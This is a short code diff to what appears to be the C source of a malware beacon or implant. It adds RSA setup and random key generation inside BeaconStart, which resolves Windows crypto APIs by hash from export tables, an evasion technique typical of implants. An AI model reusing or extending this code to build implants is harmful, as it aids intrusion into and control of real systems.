@@ -73,6 +73,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
 		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
 		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
+		Ins.api.CryptGenRandom       = PeGetFuncEat( Ins.Module[1], H_CRYPTGENRANDOM );
 		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
 		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
 		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
@@ -123,6 +124,13 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				&Ins.key[0].Len
 				))
 		{
+			if ( CryptRsaInit( &Ins ) )
+			{
+				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Key ) )
+				{
+				};
+				CryptRsaFree( &Ins );
+			};
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
 
